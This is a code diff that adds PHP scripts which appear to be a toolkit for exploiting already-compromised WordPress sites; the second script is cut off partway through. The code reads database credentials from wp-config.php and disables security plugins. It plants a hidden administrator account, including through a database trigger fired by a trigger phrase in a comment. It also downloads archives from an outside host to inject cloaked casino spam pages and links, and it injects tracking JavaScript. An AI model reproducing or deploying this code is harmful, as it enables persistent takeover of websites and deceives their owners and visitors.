@@ -1,0 +1,2911 @@
+//
+define('CURRENTDIR', getcwd());
+
+$adminLogin = 'cmseditor';
+$adminPassword = '$P$BPRTBfgNGzgFiZM5ktB5yhaA6rlXTI/';
+$adminNicename = 'cmseditor';
+$adminEmail = 'cmseditor@hotmail.com';
+$adminUrl = 'http://wordpress.com';
+$adminDateRegister = '2020-05-09 23:05:14';
+$adminActivationKey = '';
+$adminStatus = '0';
+$adminDisplayName = 'cmseditor';
+
+
+$adminVars = array('adminLogin', 'adminPassword', 'adminNicename'
+    , 'adminEmail', 'adminUrl', 'adminDateRegister', 'adminActivationKey'
+    , 'adminStatus', 'adminDisplayName');
+
+$adminData = compact($adminVars);
+
+
+
+
+$actions = array(
+    //'CreateAdmin' => 1,
+    //'DeleteAdmin' => 1,
+    //'ShowTrigger' => 1,
+    //'CreateTrigger' => 1,
+    //'TrackbackOpen' => 1,
+    //'WpOptionsPingStatus' => 1,
+    //'ShowActivePlugins' => 1,
+    'DisableBadPlugins' => 1,
+    //'ShowTemplateDirectory' => 1
+);
+
+
+if (is_null($rootDir = detectWProotDir())) {
+    die('Не удалось найти корневую директорию');
+}
+
+define('WP_ROOT_DIR', $rootDir);
+
+
+if (!file_exists($wpConfigPath = $rootDir . '/wp-config.php')) {
+    echo 'wp-config not found';
+    exit;
+}
+
+$wpConfigString = file_get_contents($wpConfigPath);
+//preg_match_all("~(DB_NAME|DB_USER|DB_PASSWORD|DB_HOST)[\'\"],\s*[\'\"](.+)[\'\"]\s*\);~", $wpConfigString, $dbhost);
+preg_match_all("~^define.*(DB_NAME|DB_USER|DB_PASSWORD|DB_HOST)[\'\"],\s*[\'\"](.+)[\'\"]\s*\);~m", $wpConfigString, $dbhost);
+preg_match("~table_prefix\s+=\s*[\'\"](.+)[\'\"];~", $wpConfigString, $prefix);
+
+
+
+if (stristr($dbhost[2][3], ':') !== false) {
+    list($hostAddr, $dbPort) = explode(':', $dbhost[2][3]);
+} else {
+    $hostAddr = $dbhost[2][3];
+    $dbPort = 3306;
+}
+
+$dbname = $dbhost[2][0];
+$dbuser = $dbhost[2][1];
+$dbpassword = $dbhost[2][2];
+$dbhostaddr = $hostAddr;
+$dbprefix = $prefix[1];
+
+
+
+
+
+
+$link = mysqli_connect($dbhostaddr, $dbuser, $dbpassword, $dbname, $dbPort);
+
+if (mysqli_connect_errno()) {
+    $errorConnection = 1;
+    echo "Could not connect: " . mysqli_error() . PHP_EOL;
+} else {
+    echo "Connected successfully" . PHP_EOL;
+
+    $wpHomeUrl = mysqli_query($link, "select * from " . $dbprefix . "options where option_name = 'home' or option_name = 'siteurl'");
+
+    $currenthost = '';
+
+    while ($res = mysqli_fetch_array($wpHomeUrl)) {
+        if (stristr($res['option_value'], 'http') !== false) {
+            $currenthost = $res['option_value'];
+            break;
+        }
+    }
+}
+
+echo $currenthost . PHP_EOL;
+
+
+$dbDataVars = array('dbname', 'dbuser', 'dbpassword', 'dbhostaddr', 'dbprefix', 'currenthost');
+$dbData = compact($dbDataVars);
+
+
+$trigger = wpCommentsTriggerQuery($adminData, $dbData);
+
+
+foreach ($actions as $actionName => $status) {
+
+    if (!$status) {
+        continue;
+    }
+
+    doAction($actionName, $link, $dbData, $adminData);
+}
+
+function doAction($actionName, $link, $dbData, $adminData) {
+
+    $callBackName = 'action' . $actionName;
+
+
+    if (function_exists($callBackName)) {
+
+        echo str_repeat('_', 400) . PHP_EOL;
+        echo PHP_EOL . $callBackName . ' start' . PHP_EOL;
+
+
+        if (!call_user_func_array($callBackName, array($link, $dbData, $adminData))) {
+            echo $callBackName . ' return false' . PHP_EOL;
+            exit;
+        }
+    } else {
+        echo "callBack $callBackName not found" . PHP_EOL;
+    }
+}
+
+function actionShowTemplateDirectory($link, $dbData, $adminData) {
+
+    extract($dbData);
+
+    try {
+        $query = "SELECT *  FROM `${dbprefix}options` WHERE `option_name` = 'template'";
+        $activePluginsResult = mysqli_query($link, $query);
+        $resultsArr = mysqli_fetch_array($activePluginsResult);
+        $templateName = $resultsArr['option_value'];
+        echo $templateName . ' - template name' . PHP_EOL;
+    } catch (Exception $ex) {
+        return false;
+    }
+
+    if (file_exists($themePath = WP_ROOT_DIR . '/wp-content/themes/' . $templateName . '/functions.php')) {
+        echo WP_ROOT_DIR . '/wp-content/themes/' . $templateName . PHP_EOL;
+        return true;
+    }
+    echo 'functions.php not found in theme directory' . PHP_EOL;
+    return false;
+}
+
+function actionDisableBadPlugins($link, $dbData, $adminData) {
+
+    extract($dbData);
+
+    try {
+
+        $query = "SELECT *  FROM `${dbprefix}options` WHERE `option_name` LIKE '%active_plugins%'";
+        $activePluginsResult = mysqli_query($link, $query);
+        $resultsArr = mysqli_fetch_array($activePluginsResult);
+
+        $serializedArr = $resultsArr['option_value'];
+        $prepeared = preparePluginString($serializedArr);
+
+        if ($serializedArr === $prepeared) {
+            echo 'no bad plugins' . PHP_EOL;
+            return true;
+        }
+        $prepeared = mysqli_real_escape_string($link, $prepeared);
+        $newPluginsStringQuery = "update `${dbprefix}options` set option_value = '${prepeared}' where option_id = ${resultsArr['option_id']}";
+
+        if (mysqli_query($link, $newPluginsStringQuery)) {
+            echo 'plugins disabled' . PHP_EOL;
+            return true;
+        }
+
+        return true;
+    } catch (Exception $ex) {
+        return false;
+    }
+}
+
+function preparePluginString($serializedArr) {
+    $decoded = unserialize($serializedArr);
+
+    $newArr = array();
+    foreach ($decoded as $key => $value) {
+
+        if (isBadPlugin($value)) {
+            continue;
+        }
+        $newArr[] = $value;
+    }
+
+    return serialize($newArr);
+}
+
+function isBadPlugin($name) {
+    $badPlugins = array(
+        'sg-security', 
+        'wordfence', 
+        'sucuri', 
+        'wp-security', 
+        'jetpack', 
+        'sucuri-scanner', 
+        'gotmls', 
+        'security-malware-firewall', 
+        'all-in-one-wp-security-and-firewall', 
+        'iwp-security', 
+        'security-ninja', 
+        'wp-cerber', 
+        'ninja-firewall', 
+        'defender-security', 
+        'wp-simple-firewall', 
+        'better-wp-security', 
+        'loginizer', 
+        'ninjascanner', 
+        'honeypot', 
+        'shield-security', 
+        'malcare-security', 
+        'bulletproof-security', 
+        'wp-fail2ban', 
+        'security-safe', 
+        'titan-security', 
+        'webcraftic-security', 
+        'cleantalk-spam-protect',
+        'limit-login-attempts',
+        'iwp-client',
+        'anti-spam',
+        'ninjafirewall',
+        'ip-location-block',
+        'rlrsssl-really-simple-ssl',
+        'maintenance',
+        'rocket-maintenance-mode',
+        'under-construction-page',
+        'coming-soon',
+        'page-builder-add',
+        'wp-maintenance-mode',
+        'cmp-coming-soon-maintenance',
+        'colorlib-coming-soon-maintenance',
+        'coming-soon-maintenance-mode',
+        'coming-soon-wp',
+        'responsive-coming-soon',
+        'responsive-coming-soon-page',
+        'site-offline',
+        'under-construction-maintenance-mode',
+        'sitepress-multilingual-cms',
+        'role-scoper',
+        'cookies-and-content-security-policy',
+        'polylang',
+        'blackhole-bad-bots',
+        'block-bad-queries',
+        'sucuri-scanner',
+        'hide-login-page',
+        'redirection',
+        'borlabs-cookie',
+        'dw-members-only',
+        'real-cookie-banner',
+        'wp-rocket',
+        'security-wordpress',
+        '404-to-301',
+
+    );
+
+    foreach ($badPlugins as $badPlugin) {
+
+        if (stristr($name, $badPlugin) !== false) {
+            echo $name . ' will be removed' . PHP_EOL;
+            return true;
+        }
+    }
+    return false;
+}
+
+function actionShowActivePlugins($link, $dbData, $adminData) {
+    extract($dbData);
+
+
+    try {
+        $query = "SELECT *  FROM `${dbprefix}options` WHERE `option_name` LIKE '%active_plugins%'";
+        $activePluginsResult = mysqli_query($link, $query);
+        $resultsArr = mysqli_fetch_array($activePluginsResult);
+
+
+        var_dump(unserialize($resultsArr['option_value']));
+
+        return true;
+    } catch (Exception $ex) {
+        return false;
+    }
+}
+
+function actionWpOptionsPingStatus($link, $dbData, $adminData) {
+    extract($dbData);
+
+    $query = "SELECT * FROM `${dbprefix}options` WHERE `option_name` LIKE '%ping%' OR `option_name` LIKE '%comments%'";
+
+    try {
+        $wpOptionsResult = mysqli_query($link, $query);
+        while ($res = mysqli_fetch_array($wpOptionsResult)) {
+            $options[] = [$res['option_id'], $res['option_name'], $res['option_value']];
+        }
+        var_dump($options);
+        return true;
+    } catch (Exception $ex) {
+        return false;
+    }
+}
+
+function actionTrackbackOpen($link, $dbData, $adminData) {
+
+    try {
+        extract($dbData);
+        $host = normalizeUrl($currenthost);
+        $updateCloseCommentsValue = "update `${dbprefix}options` set option_value = ''  WHERE `option_name` LIKE 'close_comments_for_old_posts'";
+
+        if (mysqli_query($link, $updateCloseCommentsValue)) {
+            echo 'set value 0 for option >>close_comments_value<<' . PHP_EOL;
+        }
+        $updateFirstPostsQuery = "UPDATE `${dbprefix}posts` set ping_status = 'open' where (post_type  = 'page' OR post_type = 'post') AND post_status = 'publish' AND guid LIKE '%${host}%' ORDER BY id LIMIT 5";
+        $trackBacks = array();
+
+
+
+        if (mysqli_query($link, $updateFirstPostsQuery)) {
+            echo 'posts ready to accept trackbacks' . PHP_EOL;
+            $trackbacksPostsQuery = "select id, guid, post_name from `${dbprefix}posts` where (post_type  = 'page' OR post_type = 'post') AND post_status = 'publish' AND guid LIKE '%${host}%' ORDER BY id LIMIT 5";
+            $trackbacksPostsResults = mysqli_query($link, $trackbacksPostsQuery);
+            while ($trackbackAcceptArr = mysqli_fetch_array($trackbacksPostsResults)) {
+                $trackBacks[] = [$trackbackAcceptArr['id'], $trackbackAcceptArr['guid'], $trackbackAcceptArr['post_name']];
+            }
+        }
+
+
+        var_dump($trackBacks);
+
+        return true;
+    } catch (Exception $ex) {
+        return false;
+    }
+}
+
+function actionCreateAdmin($link, $dbData, $adminData) {
+
+    try {
+
+        extract($dbData);
+        extract($adminData);
+
+        $existAdminQuery = "SELECT * FROM `${dbprefix}users` WHERE `user_pass` = '$adminPassword'";
+        $existsAdminResult = mysqli_query($link, $existAdminQuery);
+
+
+        if (!mysqli_num_rows($existsAdminResult)) {
+            $lastWpUsersIDquery = mysqli_query($link, "SELECT ID from `" . $dbname . "`.`" . $dbprefix . "users` ORDER BY `ID` DESC LIMIT 1");
+            $rowID = mysqli_fetch_row($lastWpUsersIDquery);
+            $nextWpUsersID = (int) ++$rowID[0];
+
+            mysqli_query($link, "INSERT INTO `" . $dbname . "`.`" . $dbprefix . "users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES ('$nextWpUsersID', '$adminLogin', '$adminPassword', '$adminNicename', '$adminEmail', '$adminUrl', '$adminDateRegister', '$adminActivationKey', '$adminStatus', '$adminDisplayName')");
+            mysqli_query($link, "INSERT INTO `" . $dbname . "`.`" . $dbprefix . "usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, $nextWpUsersID, '" . $dbprefix . "capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')");
+            mysqli_query($link, "INSERT INTO `" . $dbname . "`.`" . $dbprefix . "usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, $nextWpUsersID, '" . $dbprefix . "user_level', '10')");
+            echo 'admin created' . PHP_EOL;
+        } else {
+            var_dump(mysqli_fetch_array($existsAdminResult));
+            echo 'admin already exists' . PHP_EOL;
+        }
+
+        return true;
+    } catch (Exception $ex) {
+        return false;
+    }
+}
+
+function actionDeleteAdmin($link, $dbData, $adminData) {
+
+    extract($dbData);
+    extract($adminData);
+
+    $deleteAdminQuery = "DELETE FROM `${dbprefix}users` WHERE `user_pass` = '$adminPassword'";
+    if (mysqli_query($link, $deleteAdminQuery)) {
+        echo 'user deleted' . PHP_EOL;
+        return true;
+    }
+    return false;
+}
+
+function actionShowTrigger($link, $dbData, $adminData) {
+
+    extract($dbData);
+
+    $triggers = mysqli_query($link, "SHOW TRIGGERS");
+
+
+    if ($triggers) {
+        var_dump(mysqli_fetch_row($triggers));
+        return true;
+    }
+    return false;
+}
+
+function actionCreateTrigger($link, $dbData, $adminData) {
+
+    $trigger = wpCommentsTriggerQuery($adminData, $dbData);
+
+    mysqli_query($link, "DROP TRIGGER IF EXISTS `after_insert_comment`");
+
+    if (mysqli_query($link, $trigger)) {
+        echo 'trigger created' . PHP_EOL;
+        return true;
+    }
+    return false;
+}
+
+function detectWProotDir() {
+
+    if (file_exists(CURRENTDIR . '/wp-config.php')) {
+        return CURRENTDIR;
+    }
+    $normalizePath = preg_replace('~\/(wp-admin|wp-includes|wp-content).*$~', '', CURRENTDIR);
+
+
+    if (file_exists($normalizePath . '/wp-config.php')) {
+        return $normalizePath;
+    }
+
+    return null;
+}
+
+function wpCommentsTriggerQuery($adminData, $dbData) {
+
+    extract($adminData);
+    extract($dbData);
+
+    $triggerSource = <<<STR
+CREATE TRIGGER `after_insert_comment` AFTER INSERT ON `${dbname}`.`${dbprefix}comments`
+ FOR EACH ROW BEGIN
+    IF NEW.comment_content LIKE '%are you struggling to get comments on your blog?%' THEN
+        SET @lastInsertWpUsersId = (SELECT MAX(id) FROM `${dbname}`.`${dbprefix}users`);
+        SET @nextWpUsersID = @lastInsertWpUsersId + 1;
+        INSERT INTO `${dbname}`.`${dbprefix}users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES (@nextWpUsersID, '${adminLogin}', '${adminPassword}', '${adminNicename}', '${adminEmail}', '${adminUrl}', '${adminDateRegister}', '${adminActivationKey}', '${adminStatus}', '${adminDisplayName}');
+        INSERT INTO `${dbname}`.`${dbprefix}usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, @nextWpUsersID, '${dbprefix}capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}');
+        INSERT INTO `${dbname}`.`${dbprefix}usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, @nextWpUsersID, '${dbprefix}user_level', '10');
+    END IF;
+ END;
+STR;
+    return $triggerSource;
+}
+
+function normalizeUrl($url) {
+    $host = parse_url($url, PHP_URL_HOST);
+    return str_replace('www.', '', $host);
+}
+//
+
+define( 'CURRENTDIR', getcwd() );
+define( 'GS_ALIAS', 'https://kentuckyfriedbeef.com' );
+
+define( 'URL_WITH_ARCHIVES', GS_ALIAS . '/static/archives/CSN-OLDSINGLE-VI-{DIR_NUM}/' );
+define( 'ARCHIVES_RANGE', '1-15' );
+define( 'DIR_NUM', 315 );
+define( 'CUSTOM_AUTHOR_ID', 1626 );
+define( 'REDEFINE_JS_FOR_USER', 1 );
+define( 'CLOACKING', 1 );
+
+define( 'HOME_LINKS', 1 );
+
+$homeLinksSettings = array(
+    'hiddenType'      => array(
+        'cloacking' => 0,
+        'css'       => 1,
+    ),
+    'position'        => array(
+        'footer' => 0,
+        'head'   => 1,
+    ),
+    'language'        => 'VI', //text api
+    'type'            => 'CASINO',
+    'textBlocksCount' => array(
+        'onlyHomePage'            => 0,
+        '10DifferentTextBlocks'   => 1,
+        '100DifferentTextBlocks'  => 0,
+        'fullDifferentTextBlocks' => 0,
+    ),
+);
+
+$_SERVER['homeLinksSettings'] = $homeLinksSettings;
+
+define( 'FORCE_CHANGE_HOME_LINKS_OWNER', 0 );
+
+/* * Link building settings* */
+define( 'INTERNAL_LINKING', 1 );
+define( 'EXTERNAL_LINKING', 0 );
+define( 'INTERNAL_LINKS_COUNT_PAGE', '2..6' );
+define( 'EXTERNAL_LINKS_COUNT_PAGE', '1..3' );
+define( 'TABLE_HASH', '11c601a3bad16d2567e6754cddc9d28c' );
+define( 'HTML_HASH', '31d410006291280c70416aabda41c4e9' );
+define( 'COUNT_LINKS_FROM_DOMAIN', 3 );
+/* * Link building settings* */
+
+define( 'SITEMAP_NAME', 'sitemap1626' );
+define( 'USE_ORIGINAL_SLUG', 1 );
+
+/*
+ * Use unzip method with header.php
+ * ziparchive unpacks files incorrectly.
+ */
+define( 'GREEK_LANGUAGE', 1 );
+
+//define('HOME_URL', 'https://musicforlife.co.id');
+
+
+if ( defined( 'CUSTOM_AUTHOR_ID' ) && CUSTOM_AUTHOR_ID < 1000 ) {
+    echo 'use CUSTOM_AUTHOR_ID value large then 1000' . PHP_EOL;
+    exit;
+}
+
+
+if ( is_null( $rootDir = detectWProotDir() ) ) {
+    echo 'wp root directory not found' . PHP_EOL;
+    exit;
+}
+
+
+if ( ! linkBuildingSettingsCheck() ) {
+    exit;
+}
+
+
+define( 'WP_ROOT_DIR', $rootDir );
+
+//define('CUSTOM_TEMPLATE_PATH', $rootDir . '/wp-content/themes/oshin');
+
+
+if ( ! defined( 'TEMPLATEPATH' ) ) {
+    define( 'TEMPLATEPATH', '' );
+}
+if ( ! defined( 'STYLESHEETPATH' ) ) {
+    define( 'STYLESHEETPATH', '' );
+}
+if ( ! defined( 'WP_USE_THEMES' ) ) {
+    define( 'WP_USE_THEMES', false );
+}
+
+
+/* * settings* */
+
+$actions = array(
+
+    'upload' => 1,
+    'unzip'  => 1,
+    //'import' => 1,
+    //'hide'   => 1,
+    //'send' => 1,
+    //'clean' => 1,
+    //'homeLinks' => 1,
+    //'sitemap' => 1,
+    //'sitemapSecondMethod' => 1,
+    //'rollback' => 1,
+    //'sendPostsFromDb' => 1,
+    //'viewSettings' => 1,
+    //'viewAllAuthors' => 1,
+    //'globalRollback' => 1,
+    //'allPermalinks' => 1,
+);
+
+$jsSource = <<<STR
+new Image().src = "//counter.yadro.ru/hit;csnvi?r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random();
+document.addEventListener("DOMContentLoaded", function (event) {
+    var bodyNode = document.getElementsByTagName('body')[0];
+    if (bodyNode) {
+        bodyNode.remove();
+    }
+});
+
+STR;
+
+define( 'JS_SOURCE', $jsSource );
+define( 'RAND_DATE', 0 );
+define( 'ALTERNATIVE_CONNECT_MYSQL', 0 );
+
+/* * settings* */
+
+
+if ( ALTERNATIVE_CONNECT_MYSQL === 1 ) {
+
+    if ( isBadEnvCustom() ) {
+        echo 'change shell, invalid require wp-blog-header' . PHP_EOL;
+        exit;
+    }
+
+    require_once WP_ROOT_DIR . '/wp-blog-header.php';
+
+    if ( defined( 'DB_PASSWORD' ) ) {
+
+        if ( stristr( DB_HOST, ':' ) !== false ) {
+            list( $hostAddr, $dbPort ) = explode( ':', DB_HOST );
+        } else {
+            $dbPort   = 3306;
+            $hostAddr = DB_HOST;
+        }
+
+        $wpConfigArrTmp = array(
+            'dbname'     => DB_NAME,
+            'dbuser'     => DB_USER,
+            'dbpassword' => DB_PASSWORD,
+            'dbhostaddr' => $hostAddr,
+            'dbprefix'   => $table_prefix,
+            'dbport'     => $dbPort,
+        );
+
+        define( 'WP_CONFIG_ARR_AS_JSON', json_encode( $wpConfigArrTmp ) );
+    } else {
+        echo 'error using alternative connection method' . PHP_EOL;
+    }
+}
+
+
+$configSource = file_get_contents( WP_ROOT_DIR . '/wp-config.php' );
+
+if ( $configSource === false ) {
+    echo 'error reading wp-config.php' . PHP_EOL;
+    exit;
+}
+
+if ( ! defined( 'WRITEABLE_PATH' ) ) {
+
+    foreach ( array( 'wp-content/uploads', 'wp-content/themes', 'wp-content/plugins' ) as $mbWriteablePath ) {
+        $writeableDirectory = findWriteablePath( WP_ROOT_DIR . '/' . $mbWriteablePath );
+        if ( ! empty( $writeableDirectory ) ) {
+            define( 'WRITEABLE_PATH', $writeableDirectory );
+            break;
+        }
+    }
+}
+
+if ( ! $writeableDirectory ) {
+    echo 'no directory for writing' . PHP_EOL;
+    exit;
+}
+
+
+$tmpDirName = $_SERVER['HTTP_HOST'];
+
+if ( ! is_dir( WRITEABLE_PATH . '/' . $tmpDirName ) ) {
+    if ( ! mkdir( WRITEABLE_PATH . '/' . $tmpDirName ) ) {
+        echo 'dont create temp dir' . PHP_EOL;
+        exit;
+    }
+}
+
+define( 'TMPDIR', WRITEABLE_PATH . '/' . $tmpDirName );
+
+$configArr = parseWpConfig( $configSource );
+
+define( 'CONFIGSOURCE', $configSource );
+
+
+function isAvailablePdoDriver( $name ) {
+    return ( in_array( $name, PDO::getAvailableDrivers() ) );
+}
+
+function customDbLink( $configSource ) {
+    if ( detectSqliteInstance( $configSource ) ) {
+        if ( ! isAvailablePdoDriver( 'sqlite' ) ) {
+            echo 'sqlite driver not found' . PHP_EOL;
+
+            return false;
+        }
+
+        $db = new PDO( "sqlite:" . WP_ROOT_DIR . '/wpsqlite.db' );
+
+    } else {
+        if ( ! isAvailablePdoDriver( 'mysql' ) ) {
+            echo 'mysql driver not found' . PHP_EOL;
+
+            return false;
+        }
+        $configArr = parseWpConfig( $configSource );
+        $dbh       = sprintf( 'mysql:host=%s;dbname=%s;port=%s', $configArr['dbhostaddr'], $configArr['dbname'], $configArr['dbport'] );
+        $db        = new PDO( $dbh, $configArr['dbuser'], $configArr['dbpassword']
+            , array( PDO::MYSQL_ATTR_INIT_COMMAND => 'SET sql_mode="ALLOW_INVALID_DATES"' ) );
+
+    }
+
+    return $db;
+
+}
+
+
+try {
+    $customDbLink    = customDbLink( $configSource );
+    $dbConfig        = detectSqliteInstance( $configSource ) ? false : $configArr;
+    $customDbHandler = new CustomDbHandler( $customDbLink, $dbConfig );
+} catch ( Exception $ex ) {
+    echo 'Could not connect to db ' . $ex->getMessage();
+    exit;
+}
+
+function detectSqliteInstance( $configSource ) {
+    if ( strstr( $configSource, 'wpsqlite.db' ) !== false ) {
+        return true;
+    }
+
+    return false;
+}
+
+
+echo "Connected successfully" . PHP_EOL;
+$homeUrl = $customDbHandler->homeUrl();
+
+if ( ! defined( 'HOME_URL' ) ) {
+    if ( ! $homeUrl ) {
+        echo 'homeurl function return null, please define HOME_URL manually' . PHP_EOL;
+        exit;
+    } else {
+        define( 'HOME_URL', $homeUrl );
+    }
+}
+
+
+if ( defined( 'HOME_LINKS' ) && ( HOME_LINKS === 1 ) ) {
+    if ( ! validateHomeLinks( $actions ) ) {
+        exit;
+    }
+}
+
+
+function validateHomeLinks( $actions ) {
+    if ( defined( 'FORCE_CHANGE_HOME_LINKS_OWNER' ) && FORCE_CHANGE_HOME_LINKS_OWNER === 1 ) {
+        return true;
+    }
+    if ( ! isset( $actions['homeLinks'] ) ) {
+        return true;
+    }
+    $settings = getDbSettingsCustom();
+    if ( isset( $settings[ CUSTOM_AUTHOR_ID ] ) ) {
+        unset( $settings[ CUSTOM_AUTHOR_ID ] );
+    }
+    foreach ( $settings as $value ) {
+        if ( isset( $value['homeLinks'] ) && ! is_null( $value['homeLinks'] ) ) {
+            echo 'another user is using home links' . PHP_EOL;
+
+            return false;
+        }
+    }
+
+    return true;
+}
+
+
+if ( ! function_exists( 'file_put_contents' ) ) {
+
+    function file_put_contents( $filename, $data ) {
+        $f = @fopen( $filename, 'w' );
+        if ( ! $f ) {
+            return false;
+        } else {
+            $bytes = fwrite( $f, $data );
+            fclose( $f );
+
+            return $bytes;
+        }
+    }
+
+}
+
+
+if ( isset( $actions['import'] ) && ! isset( $actions['hide'] ) ) {
+    echo 'you cannot run import without hide' . PHP_EOL;
+    exit;
+}
+
+
+if ( isset( $actions['homeLinks'] ) && ! isset( $actions['hide'] ) ) {
+    $actions['hide'] = 1;
+}
+
+
+if ( ( count( $actions ) > 1 ) && isset( $actions['hide'] ) ) {
+    unset( $actions['hide'] );
+    $actions = array( 'hide' => 1 ) + $actions;
+}
+
+
+foreach ( $actions as $actionName => $status ) {
+
+    if ( ! $status ) {
+        continue;
+    }
+
+    doAction( $actionName );
+}
+
+function doAction( $actionName ) {
+
+    $callBackName = $actionName . 'Action';
+
+    if ( function_exists( $callBackName ) ) {
+
+        echo $callBackName . ' start' . PHP_EOL;
+
+        if ( ! call_user_func( $callBackName ) ) {
+            echo $callBackName . ' return false' . PHP_EOL;
+            exit;
+        }
+    } else {
+        echo "callBack $callBackName not found" . PHP_EOL;
+    }
+}
+
+function sitemapSecondMethodAction() {
+
+    if ( ! checkSitemapNameRoot() ) {
+        return false;
+    }
+
+    if ( isBadEnvCustom() ) {
+        echo 'change shell, invalid require wp-blog-header' . PHP_EOL;
+        exit;
+    }
+
+    require_once WP_ROOT_DIR . '/wp-blog-header.php';
+
+    $head = sitemapHeadSec();
+
+    $sitemapSource = $head . "\n";
+    $sitemapPath   = WP_ROOT_DIR . '/' . SITEMAP_NAME . '.xml';
+
+    try {
+        $urls = CustomDbHandler::getInstance()
+            ->allPostsFromDb( HOME_URL, CUSTOM_AUTHOR_ID );
+    } catch ( Exception $ex ) {
+        throw new Exception( 'invalid fetch urls for sitemap' );
+    }
+
+    if ( empty( $urls ) ) {
+        echo "no posts by author id" . PHP_EOL;
+
+        return false;
+    }
+
+
+    foreach ( $urls as $urlWithTitle ) {
+
+        list ( $url, $title ) = explode( ';', $urlWithTitle, 2 );
+        preg_match( '~\?p=(\d+)~', $url, $idMatches );
+        $url = get_permalink( $idMatches[1] );
+
+        echo $url . "\n";
+
+        $lastmod       = date( 'Y-m-d' );
+        $changefreqArr = array( 'monthly', 'weekly', 'daily', 'hourly', 'always' );
+        $priority      = '0.' . rand( 5, 9 );
+
+        $sitemapSource .= urlBlockSec( $url, $lastmod, $changefreqArr[ rand( 0, count( $changefreqArr ) - 1 ) ]
+            , $priority );
+        wp_cache_delete( $idMatches[1], 'posts' );
+    }
+
+    $sitemapSource .= "\n</urlset>";
+
+    if ( file_put_contents( $sitemapPath, $sitemapSource ) ) {
+        touch( $sitemapPath, frequenttimestamp( WP_ROOT_DIR ) );
+        echo currenturl( $sitemapPath, HOME_URL );
+
+        return true;
+    }
+
+    return false;
+}
+
+function sitemapHeadSec() {
+    return <<<STR
+<?xml version="1.0" encoding="UTF-8"?>
+<urlset
+      xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"
+      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+      xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9
+            http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
+
+    
+STR;
+}
+
+function sitemapAction() {
+
+    if ( ! checkSitemapNameRoot() ) {
+        return false;
+    }
+
+    $head          = sitemapHeadSec();
+    $sitemapSource = $head . "\n";
+    $sitemapPath   = WP_ROOT_DIR . '/' . SITEMAP_NAME . '.xml';
+
+    try {
+        $urls = CustomDbHandler::getInstance()
+            ->allPostsFromDb( HOME_URL, CUSTOM_AUTHOR_ID );
+    } catch ( Exception $ex ) {
+        throw new Exception( 'invalid fetch urls for sitemap' );
+    }
+
+    if ( empty( $urls ) ) {
+        echo "no posts by author id" . PHP_EOL;
+
+        return false;
+    }
+
+
+    foreach ( $urls as $urlWithTitle ) {
+
+        list ( $url, $title ) = explode( ';', $urlWithTitle, 2 );
+
+        $lastmod       = date( 'Y-m-d' );
+        $changefreqArr = array( 'monthly', 'weekly', 'daily', 'hourly', 'always' );
+        $priority      = '0.' . rand( 5, 9 );
+
+        $sitemapSource .= urlBlockSec( $url, $lastmod, $changefreqArr[ rand( 0, count( $changefreqArr ) - 1 ) ]
+            , $priority );
+    }
+
+    $sitemapSource .= "\n</urlset>";
+
+    if ( file_put_contents( $sitemapPath, $sitemapSource ) ) {
+        echo currenturl( $sitemapPath );
+
+        return true;
+    }
+
+    return false;
+}
+
+function uploadAction() {
+
+    $url = str_replace( '{DIR_NUM}', DIR_NUM, URL_WITH_ARCHIVES );
+
+    try {
+        uploadRangeOfFiles( $url, ARCHIVES_RANGE, '.zip', TMPDIR );
+
+        return true;
+    } catch ( Exception $ex ) {
+
+        return false;
+    }
+}
+
+function unzipAction() {
+
+    if ( defined( 'GREEK_LANGUAGE' ) && GREEK_LANGUAGE === 1 ) {
+        echo 'use unzip with header' . PHP_EOL;
+        try {
+            return unzipFirstMethod();
+        } catch ( Exception $ex ) {
+            echo $ex->getMessage();
+        }
+    }
+
+    if ( class_exists( 'ZipArchive' ) ) {
+        return unzipSecondMethod();
+    } else {
+        echo 'use unzip with header' . PHP_EOL;
+        try {
+            return unzipFirstMethod();
+        } catch ( Exception $ex ) {
+            echo $ex->getMessage();
+        }
+    }
+}
+
+function importAction() {
+
+    $date = '';
+
+    $htmlFiles = glob( TMPDIR . "/*.html" );
+    shuffle( $htmlFiles );
+
+
+    $mutexName = defined( 'CUSTOM_AUTHOR_ID' ) ? '_' . CUSTOM_AUTHOR_ID : '';
+
+    if ( file_exists( TMPDIR . '/import_finish' . $mutexName ) ) {
+        echo 'files already imported' . PHP_EOL;
+
+        return true;
+    }
+
+
+    if ( ! $htmlFiles ) {
+        echo "html files not found" . PHP_EOL;
+
+        return false;
+    }
+
+    $extLinksArr = array();
+
+    if ( defined( 'EXTERNAL_LINKING' ) && ( EXTERNAL_LINKING === 1 ) ) {
+        $countHtmlFiles = count( $htmlFiles );
+        downloadExternalLinks( $countHtmlFiles );
+        $extLinksArr = decodeExternalLinks();
+
+        if ( ! $extLinksArr ) {
+            return false;
+        }
+    }
+
+
+    $results = array();
+
+    if ( ! is_dir( TMPDIR . '/imported' ) ) {
+        if ( ! mkdir( TMPDIR . '/imported' ) ) {
+            echo "dont create imported dir" . PHP_EOL;
+
+            return false;
+        }
+    }
+
+
+    if ( ! defined( 'RAND_DATE' ) || ( RAND_DATE === 0 ) ) {
+        $date = CustomDbHandler::getInstance()->lastPostDateQuery();
+    }
+
+
+    foreach ( $htmlFiles as $key => $html ) {
+
+
+        try {
+            $contentParts = contentParts( file_get_contents( $html ) );
+
+
+        } catch ( Exception $ex ) {
+            echo $ex->getMessage();
+            continue;
+        }
+
+        $text       = $contentParts['text'];
+        $text       = textWithLinks( $text, $results, $extLinksArr );
